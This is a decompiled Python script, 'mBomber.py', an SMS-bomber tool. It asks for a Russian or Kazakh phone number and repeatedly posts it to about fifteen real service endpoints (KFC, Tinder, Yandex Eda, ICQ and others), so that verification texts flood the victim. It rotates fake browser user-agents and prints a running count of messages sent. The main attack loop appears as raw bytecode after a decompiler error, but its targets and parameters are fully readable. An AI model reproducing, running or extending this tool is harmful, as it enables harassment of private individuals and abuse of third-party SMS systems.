# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: mBomber.py
import random, requests, datetime
heads = [
 {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0', 
  'Accept':'*/*'},
 {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0', 
  'Accept':'*/*'},
 {'User-Agent':'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0', 
  'Accept':'*/*'},
 {'User-Agent':'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0', 
  'Accept':'*/*'},
 {'User-Agent':'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0', 
  'Accept':'*/*'}]

def check(sent, sms):
    if sent == sms:
        quit()


def time(sent):
    a = datetime.datetime.now()
    time = str(a.hour) + ':' + str(a.minute) + ':' + str(a.second)
    msg1 = str(sent) + ' смс отправлено!!!!'
    msg2 = str(time)
    if int(sent) < 10:
        print(msg1, msg2)
    elif int(sent) < 100:
        print(msg1, msg2)
    elif int(sent) < 1000:
        print(msg1, msg2)
    elif int(sent) < 10000:
        print(msg1, msg2)
    else:
        print(msg1, msg2)


def attack--- This code section failed: ---

 L.  49         0  LOAD_GLOBAL              str
                2  LOAD_CONST               7
                4  CALL_FUNCTION_1       1  ''
                6  LOAD_FAST                'number'
                8  BINARY_ADD       
               10  STORE_FAST               'number_7'

 L.  50        12  LOAD_GLOBAL              str
               14  LOAD_CONST               7
               16  CALL_FUNCTION_1       1  ''
               18  LOAD_FAST                'number'
               20  BINARY_ADD       
               22  STORE_FAST               'number_plus7'

 L.  51        24  LOAD_GLOBAL              str
               26  LOAD_CONST               8
               28  CALL_FUNCTION_1       1  ''
               30  LOAD_FAST                'number'
               32  BINARY_ADD       
               34  STORE_FAST               'number_8'

 L.  52        36  LOAD_CONST               0
               38  STORE_FAST               'sent'

 L.  53        40  LOAD_GLOBAL              random
               42  LOAD_METHOD              choice
               44  LOAD_GLOBAL              heads
               46  CALL_METHOD_1         1  ''
               48  STORE_FAST               'HEADERS'
             50_0  COME_FROM          1110  '1110'
             50_1  COME_FROM          1106  '1106'
             50_2  COME_FROM          1096  '1096'

 L.  54        50  LOAD_FAST                'sent'
               52  LOAD_FAST                'sms'
               54  COMPARE_OP               <=
            56_58  POP_JUMP_IF_FALSE  1112  'to 1112'

 L.  55        60  SETUP_FINALLY       112  'to 112'

 L.  56        62  LOAD_GLOBAL              requests
               64  LOAD_ATTR                post
               66  LOAD_STR                 'https://api.sunlight.net/v3/customers/authorization/'
               68  LOAD_STR                 'phone'
               70  LOAD_FAST                'number_7'
               72  BUILD_MAP_1           1 
               74  LOAD_FAST                'HEADERS'
               76  LOAD_CONST               ('data', 'headers')
               78  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               80  POP_TOP          

 L.  57        82  LOAD_FAST                'sent'
               84  LOAD_CONST               1
               86  INPLACE_ADD      
               88  STORE_FAST               'sent'

 L.  58        90  LOAD_GLOBAL              time
               92  LOAD_FAST                'sent'
               94  CALL_FUNCTION_1       1  ''
               96  POP_TOP          

 L.  59        98  LOAD_GLOBAL              check
              100  LOAD_FAST                'sent'
              102  LOAD_FAST                'sms'
              104  CALL_FUNCTION_2       2  ''
              106  POP_TOP          
              108  POP_BLOCK        
              110  JUMP_FORWARD        124  'to 124'
            112_0  COME_FROM_FINALLY    60  '60'

 L.  60       112  POP_TOP          
              114  POP_TOP          
              116  POP_TOP          

 L.  61       118  POP_EXCEPT       
              120  BREAK_LOOP          124  'to 124'
              122  END_FINALLY      
            124_0  COME_FROM           120  '120'
            124_1  COME_FROM           110  '110'

 L.  63       124  SETUP_FINALLY       176  'to 176'

 L.  64       126  LOAD_GLOBAL              requests
              128  LOAD_ATTR                post
              130  LOAD_STR                 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code'
              132  LOAD_STR                 'phone'
              134  LOAD_FAST                'number_7'
              136  BUILD_MAP_1           1 
              138  LOAD_FAST                'HEADERS'
              140  LOAD_CONST               ('json', 'headers')
              142  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              144  POP_TOP          

 L.  65       146  LOAD_FAST                'sent'
              148  LOAD_CONST               1
              150  INPLACE_ADD      
              152  STORE_FAST               'sent'

 L.  66       154  LOAD_GLOBAL              time
              156  LOAD_FAST                'sent'
              158  CALL_FUNCTION_1       1  ''
              160  POP_TOP          

 L.  67       162  LOAD_GLOBAL              check
              164  LOAD_FAST                'sent'
              166  LOAD_FAST                'sms'
              168  CALL_FUNCTION_2       2  ''
              170  POP_TOP          
              172  POP_BLOCK        
              174  JUMP_FORWARD        188  'to 188'
            176_0  COME_FROM_FINALLY   124  '124'

 L.  68       176  POP_TOP          
              178  POP_TOP          
              180  POP_TOP          

 L.  69       182  POP_EXCEPT       
              184  BREAK_LOOP          188  'to 188'
              186  END_FINALLY      
            188_0  COME_FROM           184  '184'
            188_1  COME_FROM           174  '174'

 L.  71       188  SETUP_FINALLY       246  'to 246'

 L.  72       190  LOAD_GLOBAL              requests
              192  LOAD_ATTR                post
              194  LOAD_STR                 'https://cloud.mail.ru/api/v2/notify/applink'
              196  LOAD_FAST                'number_plus7'
              198  LOAD_CONST               2
              200  LOAD_STR                 'email'
              202  LOAD_STR                 'x-email'
              204  LOAD_CONST               ('phone', 'api', 'email', 'x-email')
              206  BUILD_CONST_KEY_MAP_4     4 
              208  LOAD_FAST                'HEADERS'
              210  LOAD_CONST               ('json', 'headers')
              212  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              214  POP_TOP          

 L.  73       216  LOAD_FAST                'sent'
              218  LOAD_CONST               1
              220  INPLACE_ADD      
              222  STORE_FAST               'sent'

 L.  74       224  LOAD_GLOBAL              time
              226  LOAD_FAST                'sent'
              228  CALL_FUNCTION_1       1  ''
              230  POP_TOP          

 L.  75       232  LOAD_GLOBAL              check
              234  LOAD_FAST                'sent'
              236  LOAD_FAST                'sms'
              238  CALL_FUNCTION_2       2  ''
              240  POP_TOP          
              242  POP_BLOCK        
              244  JUMP_FORWARD        258  'to 258'
            246_0  COME_FROM_FINALLY   188  '188'

 L.  76       246  POP_TOP          
              248  POP_TOP          
              250  POP_TOP          

 L.  77       252  POP_EXCEPT       
              254  BREAK_LOOP          258  'to 258'
              256  END_FINALLY      
            258_0  COME_FROM           254  '254'
            258_1  COME_FROM           244  '244'

 L.  79       258  SETUP_FINALLY       310  'to 310'

 L.  80       260  LOAD_GLOBAL              requests
              262  LOAD_ATTR                post
              264  LOAD_STR                 'https://app-api.kfc.ru/api/v1/common/auth/s-validation-sms'
              266  LOAD_STR                 'phone'
              268  LOAD_FAST                'number_plus7'
              270  BUILD_MAP_1           1 
              272  LOAD_FAST                'HEADERS'
              274  LOAD_CONST               ('json', 'headers')
              276  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              278  POP_TOP          

 L.  81       280  LOAD_FAST                'sent'
              282  LOAD_CONST               1
              284  INPLACE_ADD      
              286  STORE_FAST               'sent'

 L.  82       288  LOAD_GLOBAL              time
              290  LOAD_FAST                'sent'
              292  CALL_FUNCTION_1       1  ''
              294  POP_TOP          

 L.  83       296  LOAD_GLOBAL              check
              298  LOAD_FAST                'sent'
              300  LOAD_FAST                'sms'
              302  CALL_FUNCTION_2       2  ''
              304  POP_TOP          
              306  POP_BLOCK        
              308  JUMP_FORWARD        322  'to 322'
            310_0  COME_FROM_FINALLY   258  '258'

 L.  84       310  POP_TOP          
              312  POP_TOP          
              314  POP_TOP          

 L.  85       316  POP_EXCEPT       
              318  BREAK_LOOP          322  'to 322'
              320  END_FINALLY      
            322_0  COME_FROM           318  '318'
            322_1  COME_FROM           308  '308'

 L.  87       322  SETUP_FINALLY       374  'to 374'

 L.  88       324  LOAD_GLOBAL              requests
              326  LOAD_ATTR                post
              328  LOAD_STR                 'https://b.utair.ru/api/v1/login/'
              330  LOAD_STR                 'login'
              332  LOAD_FAST                'number_8'
              334  BUILD_MAP_1           1 
              336  LOAD_FAST                'HEADERS'
              338  LOAD_CONST               ('data', 'headers')
              340  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              342  POP_TOP          

 L.  89       344  LOAD_FAST                'sent'
              346  LOAD_CONST               1
              348  INPLACE_ADD      
              350  STORE_FAST               'sent'

 L.  90       352  LOAD_GLOBAL              time
              354  LOAD_FAST                'sent'
              356  CALL_FUNCTION_1       1  ''
              358  POP_TOP          

 L.  91       360  LOAD_GLOBAL              check
              362  LOAD_FAST                'sent'
              364  LOAD_FAST                'sms'
              366  CALL_FUNCTION_2       2  ''
              368  POP_TOP          
              370  POP_BLOCK        
              372  JUMP_FORWARD        386  'to 386'
            374_0  COME_FROM_FINALLY   322  '322'

 L.  92       374  POP_TOP          
              376  POP_TOP          
              378  POP_TOP          

 L.  93       380  POP_EXCEPT       
              382  BREAK_LOOP          386  'to 386'
              384  END_FINALLY      
            386_0  COME_FROM           382  '382'
            386_1  COME_FROM           372  '372'

 L.  95       386  SETUP_FINALLY       438  'to 438'

 L.  96       388  LOAD_GLOBAL              requests
              390  LOAD_ATTR                post
              392  LOAD_STR                 'https://api.gotinder.com/v2/auth/sms/s?auth_type=sms&locale=ru'
              394  LOAD_STR                 'phone_number'
              396  LOAD_FAST                'number_7'
              398  BUILD_MAP_1           1 
              400  LOAD_FAST                'HEADERS'
              402  LOAD_CONST               ('data', 'headers')
              404  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              406  POP_TOP          

 L.  97       408  LOAD_FAST                'sent'
              410  LOAD_CONST               1
              412  INPLACE_ADD      
              414  STORE_FAST               'sent'

 L.  98       416  LOAD_GLOBAL              time
              418  LOAD_FAST                'sent'
              420  CALL_FUNCTION_1       1  ''
              422  POP_TOP          

 L.  99       424  LOAD_GLOBAL              check
              426  LOAD_FAST                'sent'
              428  LOAD_FAST                'sms'
              430  CALL_FUNCTION_2       2  ''
              432  POP_TOP          
              434  POP_BLOCK        
              436  JUMP_FORWARD        450  'to 450'
            438_0  COME_FROM_FINALLY   386  '386'

 L. 100       438  POP_TOP          
              440  POP_TOP          
              442  POP_TOP          

 L. 101       444  POP_EXCEPT       
              446  BREAK_LOOP          450  'to 450'
              448  END_FINALLY      
            450_0  COME_FROM           446  '446'
            450_1  COME_FROM           436  '436'

 L. 103       450  SETUP_FINALLY       504  'to 504'

 L. 104       452  LOAD_GLOBAL              requests
              454  LOAD_ATTR                post
              456  LOAD_STR                 'https://www.citilink.ru/registration/confirm/phone/+'
              458  LOAD_FAST                'number_7'
              460  BINARY_ADD       
              462  LOAD_STR                 '/'
              464  BINARY_ADD       
              466  LOAD_FAST                'HEADERS'
              468  LOAD_CONST               ('headers',)
              470  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              472  POP_TOP          

 L. 105       474  LOAD_FAST                'sent'
              476  LOAD_CONST               1
              478  INPLACE_ADD      
              480  STORE_FAST               'sent'

 L. 106       482  LOAD_GLOBAL              time
              484  LOAD_FAST                'sent'
              486  CALL_FUNCTION_1       1  ''
              488  POP_TOP          

 L. 107       490  LOAD_GLOBAL              check
              492  LOAD_FAST                'sent'
              494  LOAD_FAST                'sms'
              496  CALL_FUNCTION_2       2  ''
              498  POP_TOP          
              500  POP_BLOCK        
              502  JUMP_FORWARD        516  'to 516'
            504_0  COME_FROM_FINALLY   450  '450'

 L. 108       504  POP_TOP          
              506  POP_TOP          
              508  POP_TOP          

 L. 109       510  POP_EXCEPT       
              512  BREAK_LOOP          516  'to 516'
              514  END_FINALLY      
            516_0  COME_FROM           512  '512'
            516_1  COME_FROM           502  '502'

 L. 111       516  SETUP_FINALLY       568  'to 568'

 L. 112       518  LOAD_GLOBAL              requests
              520  LOAD_ATTR                post
              522  LOAD_STR                 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone'
              524  LOAD_STR                 'st.r.phone'
              526  LOAD_FAST                'number_plus7'
              528  BUILD_MAP_1           1 
              530  LOAD_FAST                'HEADERS'
              532  LOAD_CONST               ('data', 'headers')
              534  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              536  POP_TOP          

 L. 113       538  LOAD_FAST                'sent'
              540  LOAD_CONST               1
              542  INPLACE_ADD      
              544  STORE_FAST               'sent'

 L. 114       546  LOAD_GLOBAL              time
              548  LOAD_FAST                'sent'
              550  CALL_FUNCTION_1       1  ''
              552  POP_TOP          

 L. 115       554  LOAD_GLOBAL              check
              556  LOAD_FAST                'sent'
              558  LOAD_FAST                'sms'
              560  CALL_FUNCTION_2       2  ''
              562  POP_TOP          
              564  POP_BLOCK        
              566  JUMP_FORWARD        580  'to 580'
            568_0  COME_FROM_FINALLY   516  '516'

 L. 116       568  POP_TOP          
              570  POP_TOP          
              572  POP_TOP          

 L. 117       574  POP_EXCEPT       
              576  BREAK_LOOP          580  'to 580'
              578  END_FINALLY      
            580_0  COME_FROM           576  '576'
            580_1  COME_FROM           566  '566'

 L. 119       580  SETUP_FINALLY       632  'to 632'

 L. 120       582  LOAD_GLOBAL              requests
              584  LOAD_ATTR                post
              586  LOAD_STR                 'https://app.karusel.ru/api/v1/phone/'
              588  LOAD_STR                 'phone'
              590  LOAD_FAST                'number_7'
              592  BUILD_MAP_1           1 
              594  LOAD_FAST                'HEADERS'
              596  LOAD_CONST               ('data', 'headers')
              598  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              600  POP_TOP          

 L. 121       602  LOAD_FAST                'sent'
              604  LOAD_CONST               1
              606  INPLACE_ADD      
              608  STORE_FAST               'sent'

 L. 122       610  LOAD_GLOBAL              time
              612  LOAD_FAST                'sent'
              614  CALL_FUNCTION_1       1  ''
              616  POP_TOP          

 L. 123       618  LOAD_GLOBAL              check
              620  LOAD_FAST                'sent'
              622  LOAD_FAST                'sms'
              624  CALL_FUNCTION_2       2  ''
              626  POP_TOP          
              628  POP_BLOCK        
              630  JUMP_FORWARD        644  'to 644'
            632_0  COME_FROM_FINALLY   580  '580'

 L. 124       632  POP_TOP          
              634  POP_TOP          
              636  POP_TOP          

 L. 125       638  POP_EXCEPT       
              640  BREAK_LOOP          644  'to 644'
              642  END_FINALLY      
            644_0  COME_FROM           640  '640'
            644_1  COME_FROM           630  '630'

 L. 127       644  SETUP_FINALLY       698  'to 698'

 L. 128       646  LOAD_GLOBAL              requests
              648  LOAD_ATTR                post
              650  LOAD_STR                 'https://youdrive.today/login/web/phone'
              652  LOAD_FAST                'number'
              654  LOAD_STR                 '7'
              656  LOAD_CONST               ('phone', 'phone_code')
              658  BUILD_CONST_KEY_MAP_2     2 
              660  LOAD_FAST                'HEADERS'
              662  LOAD_CONST               ('data', 'headers')
              664  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              666  POP_TOP          

 L. 129       668  LOAD_FAST                'sent'
              670  LOAD_CONST               1
              672  INPLACE_ADD      
              674  STORE_FAST               'sent'

 L. 130       676  LOAD_GLOBAL              time
              678  LOAD_FAST                'sent'
              680  CALL_FUNCTION_1       1  ''
              682  POP_TOP          

 L. 131       684  LOAD_GLOBAL              check
              686  LOAD_FAST                'sent'
              688  LOAD_FAST                'sms'
              690  CALL_FUNCTION_2       2  ''
              692  POP_TOP          
              694  POP_BLOCK        
              696  JUMP_FORWARD        710  'to 710'
            698_0  COME_FROM_FINALLY   644  '644'

 L. 132       698  POP_TOP          
              700  POP_TOP          
              702  POP_TOP          

 L. 133       704  POP_EXCEPT       
              706  BREAK_LOOP          710  'to 710'
              708  END_FINALLY      
            710_0  COME_FROM           706  '706'
            710_1  COME_FROM           696  '696'

 L. 135       710  SETUP_FINALLY       762  'to 762'

 L. 136       712  LOAD_GLOBAL              requests
              714  LOAD_ATTR                post
              716  LOAD_STR                 'https://api.mtstv.ru/v1/users'
              718  LOAD_STR                 'msisdn'
              720  LOAD_FAST                'number_7'
              722  BUILD_MAP_1           1 
              724  LOAD_FAST                'HEADERS'
              726  LOAD_CONST               ('json', 'headers')
              728  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              730  POP_TOP          

 L. 137       732  LOAD_FAST                'sent'
              734  LOAD_CONST               1
              736  INPLACE_ADD      
              738  STORE_FAST               'sent'

 L. 138       740  LOAD_GLOBAL              time
              742  LOAD_FAST                'sent'
              744  CALL_FUNCTION_1       1  ''
              746  POP_TOP          

 L. 139       748  LOAD_GLOBAL              check
              750  LOAD_FAST                'sent'
              752  LOAD_FAST                'sms'
              754  CALL_FUNCTION_2       2  ''
              756  POP_TOP          
              758  POP_BLOCK        
              760  JUMP_FORWARD        774  'to 774'
            762_0  COME_FROM_FINALLY   710  '710'

 L. 140       762  POP_TOP          
              764  POP_TOP          
              766  POP_TOP          

 L. 141       768  POP_EXCEPT       
              770  BREAK_LOOP          774  'to 774'
              772  END_FINALLY      
            774_0  COME_FROM           770  '770'
            774_1  COME_FROM           760  '760'

 L. 143       774  SETUP_FINALLY       826  'to 826'

 L. 144       776  LOAD_GLOBAL              requests
              778  LOAD_ATTR                post
              780  LOAD_STR                 'https://youla.ru/web-api/auth/request_code'
              782  LOAD_STR                 'phone'
              784  LOAD_FAST                'number_plus7'
              786  BUILD_MAP_1           1 
              788  LOAD_FAST                'HEADERS'
              790  LOAD_CONST               ('json', 'headers')
              792  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              794  POP_TOP          

 L. 145       796  LOAD_FAST                'sent'
              798  LOAD_CONST               1
              800  INPLACE_ADD      
              802  STORE_FAST               'sent'

 L. 146       804  LOAD_GLOBAL              time
              806  LOAD_FAST                'sent'
              808  CALL_FUNCTION_1       1  ''
              810  POP_TOP          

 L. 147       812  LOAD_GLOBAL              check
              814  LOAD_FAST                'sent'
              816  LOAD_FAST                'sms'
              818  CALL_FUNCTION_2       2  ''
              820  POP_TOP          
              822  POP_BLOCK        
              824  JUMP_FORWARD        838  'to 838'
            826_0  COME_FROM_FINALLY   774  '774'

 L. 148       826  POP_TOP          
              828  POP_TOP          
              830  POP_TOP          

 L. 149       832  POP_EXCEPT       
              834  BREAK_LOOP          838  'to 838'
              836  END_FINALLY      
            838_0  COME_FROM           834  '834'
            838_1  COME_FROM           824  '824'

 L. 151       838  SETUP_FINALLY       894  'to 894'

 L. 152       840  LOAD_GLOBAL              requests
              842  LOAD_ATTR                post
              844  LOAD_STR                 'https://eda.yandex/api/v1/user/request_authentication_code'
              846  LOAD_STR                 'phone_number'
              848  LOAD_STR                 '+'
              850  LOAD_FAST                'number_7'
              852  BINARY_ADD       
              854  BUILD_MAP_1           1 
              856  LOAD_FAST                'HEADERS'
              858  LOAD_CONST               ('json', 'headers')
              860  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              862  POP_TOP          

 L. 153       864  LOAD_FAST                'sent'
              866  LOAD_CONST               1
              868  INPLACE_ADD      
              870  STORE_FAST               'sent'

 L. 154       872  LOAD_GLOBAL              time
              874  LOAD_FAST                'sent'
              876  CALL_FUNCTION_1       1  ''
              878  POP_TOP          

 L. 155       880  LOAD_GLOBAL              check
              882  LOAD_FAST                'sent'
              884  LOAD_FAST                'sms'
              886  CALL_FUNCTION_2       2  ''
              888  POP_TOP          
              890  POP_BLOCK        
              892  JUMP_FORWARD        906  'to 906'
            894_0  COME_FROM_FINALLY   838  '838'

 L. 156       894  POP_TOP          
              896  POP_TOP          
              898  POP_TOP          

 L. 157       900  POP_EXCEPT       
              902  BREAK_LOOP          906  'to 906'
              904  END_FINALLY      
            906_0  COME_FROM           902  '902'
            906_1  COME_FROM           892  '892'

 L. 159       906  SETUP_FINALLY       958  'to 958'

 L. 160       908  LOAD_GLOBAL              requests
              910  LOAD_ATTR                post
              912  LOAD_STR                 'https://api.ivi.ru/mobileapi/user/register/phone/v6'
              914  LOAD_STR                 'phone'
              916  LOAD_FAST                'number_7'
              918  BUILD_MAP_1           1 
              920  LOAD_FAST                'HEADERS'
              922  LOAD_CONST               ('data', 'headers')
              924  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              926  POP_TOP          

 L. 161       928  LOAD_FAST                'sent'
              930  LOAD_CONST               1
              932  INPLACE_ADD      
              934  STORE_FAST               'sent'

 L. 162       936  LOAD_GLOBAL              time
              938  LOAD_FAST                'sent'
              940  CALL_FUNCTION_1       1  ''
              942  POP_TOP          

 L. 163       944  LOAD_GLOBAL              check
              946  LOAD_FAST                'sent'
              948  LOAD_FAST                'sms'
              950  CALL_FUNCTION_2       2  ''
              952  POP_TOP          
              954  POP_BLOCK        
              956  JUMP_FORWARD        970  'to 970'
            958_0  COME_FROM_FINALLY   906  '906'

 L. 164       958  POP_TOP          
              960  POP_TOP          
              962  POP_TOP          

 L. 165       964  POP_EXCEPT       
              966  BREAK_LOOP          970  'to 970'
              968  END_FINALLY      
            970_0  COME_FROM           966  '966'
            970_1  COME_FROM           956  '956'

 L. 167       970  SETUP_FINALLY      1024  'to 1024'

 L. 168       972  LOAD_GLOBAL              requests
              974  LOAD_ATTR                post
              976  LOAD_STR                 'https://api.delitime.ru/api/v2/signup'
              978  LOAD_FAST                'number_7'
              980  LOAD_CONST               3
              982  LOAD_CONST               ('SignupForm[username]', 'SignupForm[device_type]')
              984  BUILD_CONST_KEY_MAP_2     2 
              986  LOAD_FAST                'HEADERS'
              988  LOAD_CONST               ('data', 'headers')
              990  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              992  POP_TOP          

 L. 169       994  LOAD_FAST                'sent'
              996  LOAD_CONST               1
              998  INPLACE_ADD      
             1000  STORE_FAST               'sent'

 L. 170      1002  LOAD_GLOBAL              time
             1004  LOAD_FAST                'sent'
             1006  CALL_FUNCTION_1       1  ''
             1008  POP_TOP          

 L. 171      1010  LOAD_GLOBAL              check
             1012  LOAD_FAST                'sent'
             1014  LOAD_FAST                'sms'
             1016  CALL_FUNCTION_2       2  ''
             1018  POP_TOP          
             1020  POP_BLOCK        
             1022  JUMP_FORWARD       1036  'to 1036'
           1024_0  COME_FROM_FINALLY   970  '970'

 L. 172      1024  POP_TOP          
             1026  POP_TOP          
             1028  POP_TOP          

 L. 173      1030  POP_EXCEPT       
             1032  BREAK_LOOP         1036  'to 1036'
             1034  END_FINALLY      
           1036_0  COME_FROM          1032  '1032'
           1036_1  COME_FROM          1022  '1022'

 L. 175      1036  SETUP_FINALLY      1098  'to 1098'

 L. 176      1038  LOAD_GLOBAL              requests
             1040  LOAD_ATTR                post
             1042  LOAD_STR                 'https://www.icq.com/smsreg/requestPhoneValidation.php'
             1044  LOAD_FAST                'number_7'
             1046  LOAD_STR                 'en'
             1048  LOAD_STR                 'ru'
             1050  LOAD_STR                 '1'
             1052  LOAD_STR                 'ic1rtwz1s1Hj1O0r'
             1054  LOAD_STR                 '46763'
             1056  LOAD_CONST               ('msisdn', 'locale', 'countryCode', 'version', 'k', 'r')
             1058  BUILD_CONST_KEY_MAP_6     6 
             1060  LOAD_FAST                'HEADERS'
             1062  LOAD_CONST               ('data', 'headers')
             1064  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
             1066  POP_TOP          

 L. 177      1068  LOAD_FAST                'sent'
             1070  LOAD_CONST               1
             1072  INPLACE_ADD      
             1074  STORE_FAST               'sent'

 L. 178      1076  LOAD_GLOBAL              time
             1078  LOAD_FAST                'sent'
             1080  CALL_FUNCTION_1       1  ''
             1082  POP_TOP          

 L. 179      1084  LOAD_GLOBAL              check
             1086  LOAD_FAST                'sent'
             1088  LOAD_FAST                'sms'
             1090  CALL_FUNCTION_2       2  ''
             1092  POP_TOP          
             1094  POP_BLOCK        
             1096  JUMP_BACK            50  'to 50'
           1098_0  COME_FROM_FINALLY  1036  '1036'

 L. 180      1098  POP_TOP          
             1100  POP_TOP          
             1102  POP_TOP          

 L. 181      1104  POP_EXCEPT       
             1106  JUMP_BACK            50  'to 50'
             1108  END_FINALLY      
             1110  JUMP_BACK            50  'to 50'
           1112_0  COME_FROM            56  '56'

Parse error at or near `END_FINALLY' instruction at offset 122


title = '\n\n SMS-bomber on python 3.x \n\n Автор: markhabaevv     \n\n Инстаграм: markhabaevv.soft\n\n   /\\    /\\    /\\  |-\\| /|_   /\\  |_   /\\  |-- \\    /\\    /\n  /  \\  /  \\  /__\\ |-/|/ | | /__\\ | | /__\\ |__  \\  /  \\  /\n /    \\/    \\/    \\|\\ |\\ | |/    \\|_|/    \\|__   \\/    \\/\n\n'
print(title)
print('Введи номер без префиксов +7 и 8\nНапример: 7071112233')
input_number = input('>> ')
print('Сколько циклов атак провести?')
sms = int(input('>> '))

def parse_number(number):
    msg = 'проверка номера - Заебись!'
    if len(number) in (10, 11, 12):
        if number[0] == '8':
            number = number[1:]
            print(msg)
        elif number[:2] == '+7':
            number = number[2:]
            print(msg)
        elif not int(len(number)) == 10 or number[0] == 9:
            print(msg)
    else:
        print('проверка номера - ОШИБКА!!!\nПроверь введенный номер (бомбер пока что атакаует только русские и казахсианские номера!')
        quit()
    return number


number = parse_number(input_number)
attack(number, sms)